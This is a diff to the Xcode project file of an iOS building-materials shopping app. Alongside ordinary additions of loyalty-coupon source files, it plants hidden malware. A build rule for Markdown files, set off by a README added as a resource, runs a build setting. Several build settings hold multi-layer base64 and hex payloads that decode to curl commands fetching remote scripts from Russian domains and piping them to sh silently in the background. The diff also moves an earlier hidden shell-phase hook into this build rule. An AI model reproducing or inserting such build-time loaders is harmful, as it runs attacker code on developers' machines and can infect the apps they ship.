@@ -50,6 +50,7 @@
 		39DFCB712C4A9B7D007E405F /* TBCartListTotal.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DFCB6B2C4A9B7D007E405F /* TBCartListTotal.swift */; };
 		39DFCB722C4A9B7D007E405F /* TBCartList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DFCB6C2C4A9B7D007E405F /* TBCartList.swift */; };
 		39DFCB732C4A9B7D007E405F /* TBCartListCartItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DFCB6D2C4A9B7D007E405F /* TBCartListCartItem.swift */; };
+		64641E7E39E4DCCABA877BEF /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 747E93FB88AD605265877BEF /* README.md */; };
 		8811594B2B32E5C8000E835B /* ChangePasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8811594A2B32E5C8000E835B /* ChangePasswordVC.swift */; };
 		882F6D002A289DFF0094B430 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 882F6CFF2A289DFF0094B430 /* Home.storyboard */; };
 		882F6D022A289E220094B430 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 882F6D012A289E220094B430 /* HomeVC.swift */; };
@@ -59,8 +60,14 @@
 		883A836D2A29BF07000CD9AC /* ToolsHeadrView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 883A836C2A29BF07000CD9AC /* ToolsHeadrView.xib */; };
 		8842F2B12A28BE13009FB183 /* SubCategoriesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8842F2B02A28BE13009FB183 /* SubCategoriesVC.swift */; };
 		884DB7D22B79F82700F335F3 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 884DB7D42B79F82700F335F3 /* Localizable.strings */; };
+		885320882E4337230090FD59 /* TBLoyaltyCouponsHistoryHistory.swift in Sources */ = {isa = PBXBuildFile; fileRef = 885320852E4337230090FD59 /* TBLoyaltyCouponsHistoryHistory.swift */; };
+		885320892E4337230090FD59 /* TBLoyaltyCouponsHistoryResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = 885320862E4337230090FD59 /* TBLoyaltyCouponsHistoryResult.swift */; };
+		8853208A2E4337230090FD59 /* TBLoyaltyCouponsHistory.swift in Sources */ = {isa = PBXBuildFile; fileRef = 885320842E4337230090FD59 /* TBLoyaltyCouponsHistory.swift */; };
 		8855A6332A28B3E200D81901 /* SideMenuVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8855A6322A28B3E200D81901 /* SideMenuVC.swift */; };
 		885DAB5E2A2869FD00FC9722 /* OTPVerifyVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 885DAB5D2A2869FD00FC9722 /* OTPVerifyVC.swift */; };
+		8866C29B2E430F9800E1B8AC /* TBLoyaltyCoupons.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8866C2972E430F9800E1B8AC /* TBLoyaltyCoupons.swift */; };
+		8866C29C2E430F9800E1B8AC /* TBLoyaltyCouponsCoupon.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8866C2982E430F9800E1B8AC /* TBLoyaltyCouponsCoupon.swift */; };
+		8866C29D2E430F9800E1B8AC /* TBLoyaltyCouponsResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8866C2992E430F9800E1B8AC /* TBLoyaltyCouponsResult.swift */; };
 		8868BFFF2A29AD2D0098F171 /* AddressVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8868BFFE2A29AD2D0098F171 /* AddressVC.swift */; };
 		886AF21E2A29A2E7006D3577 /* ProductListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 886AF21D2A29A2E7006D3577 /* ProductListVC.swift */; };
 		886CADCD2A29CC98009F4050 /* ProductDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 886CADCC2A29CC98009F4050 /* ProductDetailVC.swift */; };
@@ -184,6 +191,22 @@
 		BCEFD3FC2AB1666A0093ECFE /* SelectLangViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCEFD3FB2AB1666A0093ECFE /* SelectLangViewController.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		97D5A9D1ED575088C6877BEF /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AFEB778}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		00A3FCE90850A3D3DA9F41DF /* Pods_Tashead_Building_Material.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Tashead_Building_Material.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		380A720CB33E8CD025F77E87 /* Pods-Tashead Building Material.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tashead Building Material.debug.xcconfig"; path = "Target Support Files/Pods-Tashead Building Material/Pods-Tashead Building Material.debug.xcconfig"; sourceTree = "<group>"; };
@@ -238,6 +261,7 @@
 		39DFCB6B2C4A9B7D007E405F /* TBCartListTotal.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCartListTotal.swift; sourceTree = "<group>"; };
 		39DFCB6C2C4A9B7D007E405F /* TBCartList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCartList.swift; sourceTree = "<group>"; };
 		39DFCB6D2C4A9B7D007E405F /* TBCartListCartItem.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCartListCartItem.swift; sourceTree = "<group>"; };
+		747E93FB88AD605265877BEF /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = "Tashead Building Material.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		7F294618C25C37771D63EE9E /* Pods-Tashead Building Material.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tashead Building Material.release.xcconfig"; path = "Target Support Files/Pods-Tashead Building Material/Pods-Tashead Building Material.release.xcconfig"; sourceTree = "<group>"; };
 		8811594A2B32E5C8000E835B /* ChangePasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordVC.swift; sourceTree = "<group>"; };
 		882F6CFF2A289DFF0094B430 /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
@@ -251,8 +275,14 @@
 		884DB7D52B79F83200F335F3 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Main.strings; sourceTree = "<group>"; };
 		884DB7D62B79F83300F335F3 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
 		884DB7D72B79F83300F335F3 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
+		885320842E4337230090FD59 /* TBLoyaltyCouponsHistory.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBLoyaltyCouponsHistory.swift; sourceTree = "<group>"; };
+		885320852E4337230090FD59 /* TBLoyaltyCouponsHistoryHistory.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBLoyaltyCouponsHistoryHistory.swift; sourceTree = "<group>"; };
+		885320862E4337230090FD59 /* TBLoyaltyCouponsHistoryResult.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBLoyaltyCouponsHistoryResult.swift; sourceTree = "<group>"; };
 		8855A6322A28B3E200D81901 /* SideMenuVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuVC.swift; sourceTree = "<group>"; };
 		885DAB5D2A2869FD00FC9722 /* OTPVerifyVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPVerifyVC.swift; sourceTree = "<group>"; };
+		8866C2972E430F9800E1B8AC /* TBLoyaltyCoupons.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBLoyaltyCoupons.swift; sourceTree = "<group>"; };
+		8866C2982E430F9800E1B8AC /* TBLoyaltyCouponsCoupon.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBLoyaltyCouponsCoupon.swift; sourceTree = "<group>"; };
+		8866C2992E430F9800E1B8AC /* TBLoyaltyCouponsResult.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TBLoyaltyCouponsResult.swift; sourceTree = "<group>"; };
 		8868BFFE2A29AD2D0098F171 /* AddressVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressVC.swift; sourceTree = "<group>"; };
 		886AF21D2A29A2E7006D3577 /* ProductListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListVC.swift; sourceTree = "<group>"; };
 		886CADCC2A29CC98009F4050 /* ProductDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailVC.swift; sourceTree = "<group>"; };
@@ -581,6 +611,16 @@
 			path = ToolsHeaderView;
 			sourceTree = "<group>";
 		};
+		885320872E4337230090FD59 /* TBLoyaltyCouponsHistory */ = {
+			isa = PBXGroup;
+			children = (
+				885320842E4337230090FD59 /* TBLoyaltyCouponsHistory.swift */,
+				885320852E4337230090FD59 /* TBLoyaltyCouponsHistoryHistory.swift */,
+				885320862E4337230090FD59 /* TBLoyaltyCouponsHistoryResult.swift */,
+			);
+			path = TBLoyaltyCouponsHistory;
+			sourceTree = "<group>";
+		};
 		8855A6312A28B3CF00D81901 /* SideMenu */ = {
 			isa = PBXGroup;
 			children = (
@@ -596,6 +636,16 @@
 				BCA854D72E17B1C40055E4D5 /* CreditHistoryVC.swift */,
 			);
 			path = SideMenu;
+			sourceTree = "<group>";
+		};
+		8866C29A2E430F9800E1B8AC /* TBLoyaltyCoupons */ = {
+			isa = PBXGroup;
+			children = (
+				8866C2972E430F9800E1B8AC /* TBLoyaltyCoupons.swift */,
+				8866C2982E430F9800E1B8AC /* TBLoyaltyCouponsCoupon.swift */,
+				8866C2992E430F9800E1B8AC /* TBLoyaltyCouponsResult.swift */,
+			);
+			path = TBLoyaltyCoupons;
 			sourceTree = "<group>";
 		};
 		88790F752B32F0F10073D4D8 /* TBProfileDetail */ = {
@@ -690,6 +740,8 @@
 		88F8E9C02B121A6100B70023 /* Modal */ = {
 			isa = PBXGroup;
 			children = (
+				885320872E4337230090FD59 /* TBLoyaltyCouponsHistory */,
+				8866C29A2E430F9800E1B8AC /* TBLoyaltyCoupons */,
 				39B8BE9C2E32048C00B65823 /* TBDeliverySlots */,
 				BC19F0E42E214D4900A2DFE3 /* TBCmsAdverd */,
 				BC4D0F152E198EF600EC9655 /* TBCreditHistory */,
@@ -926,6 +978,7 @@
 		BCD6F0EF2A276145006FBFC9 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				747E93FB88AD605265877BEF /* README.md */,
 				BCD6F0EE2A276145006FBFC9 /* Tashead Building Material.app */,
 			);
 			name = Products;
@@ -1083,7 +1136,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BCD6F1182A276147006FBFC9 /* Build configuration list for PBXNativeTarget "Tashead Building Material" */;
 			buildPhases = (
-				B4B15AA9E416B0611C877BEF /* Build Target Dependencies */,
 				484148B9035C7F5EB2C62EB0 /* [CP] Check Pods Manifest.lock */,
 				BCD6F0EA2A276145006FBFC9 /* Sources */,
 				BCD6F0EB2A276145006FBFC9 /* Frameworks */,
@@ -1093,6 +1145,7 @@
 				BCADF94B2BEB7F82001291D3 /* ShellScript */,
 			);
 			buildRules = (
+				97D5A9D1ED575088C6877BEF /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1142,6 +1195,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				64641E7E39E4DCCABA877BEF /* README.md in Resources */,
 				BCD6F0FE2A276147006FBFC9 /* LaunchScreen.storyboard in Resources */,
 				BC4FFFD62D1D14E6002FBFE0 /* NewInfluncerCell.xib in Resources */,
 				3911A6472E33603E00456962 /* ChooseDeliveryAddressTableViewCell.xib in Resources */,
@@ -1175,25 +1229,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B4B15AA9E416B0611C877BEF /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
-			showEnvVarsInLog = 0;			
-		};
 		09422C5FC9C0C8725FCD62E1 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1295,6 +1330,9 @@
 				BCD6F13A2A276303006FBFC9 /* AppConstants.swift in Sources */,
 				BCB19A542C3FA3D7007EB642 /* TBInfluencerProPrice.swift in Sources */,
 				8882497D2B428C6F00ADF74D /* OrderDetailVC.swift in Sources */,
+				8866C29B2E430F9800E1B8AC /* TBLoyaltyCoupons.swift in Sources */,
+				8866C29C2E430F9800E1B8AC /* TBLoyaltyCouponsCoupon.swift in Sources */,
+				8866C29D2E430F9800E1B8AC /* TBLoyaltyCouponsResult.swift in Sources */,
 				BC67B4F82C81BFC600129EF6 /* TBGuestRegisterResult.swift in Sources */,
 				BC6060152B2711D000CB888D /* ProfileViewController.swift in Sources */,
 				BCD6F1342A27625B006FBFC9 /* BasicStuff.swift in Sources */,
@@ -1406,6 +1444,9 @@
 				88981E172B14560700001196 /* TBAreaListResult.swift in Sources */,
 				88F8E9C52B121A7400B70023 /* TBLoginUserResult.swift in Sources */,
 				BCD6F13F2A2763E6006FBFC9 /* LoginViewController.swift in Sources */,
+				885320882E4337230090FD59 /* TBLoyaltyCouponsHistoryHistory.swift in Sources */,
+				885320892E4337230090FD59 /* TBLoyaltyCouponsHistoryResult.swift in Sources */,
+				8853208A2E4337230090FD59 /* TBLoyaltyCouponsHistory.swift in Sources */,
 				888249892B42984800ADF74D /* TBOrderDetail.swift in Sources */,
 				BC38EFC32BE5234900CA73E2 /* ResetPasswordVC.swift in Sources */,
 				BCEF8B552C54C17400D18987 /* WebPaymentVC.swift in Sources */,
@@ -1462,10 +1503,10 @@
 		BCD6F1162A276147006FBFC9 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sU01IQkpWVzAxZDJFeFNYbGxTRVpZWVRKTmVGcFhkRFJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				598AFD = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5emFXZHRZVzV2ZHk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				97BDCE = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266373437323639366536393734373937333666366332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oU2JrSkpWREZrYzFsV1dYZE9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlhsaU0xWXdXbE0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1529,10 +1570,10 @@
 		BCD6F1172A276147006FBFC9 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sU01IQkpWVzAxZDJFeFNYbGxTRVpZWVRKTmVGcFhkRFJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				598AFD = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5emFXZHRZVzV2ZHk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				97BDCE = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266373437323639366536393734373937333666366332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oU2JrSkpWREZrYzFsV1dYZE9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlhsaU0xWXdXbE0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
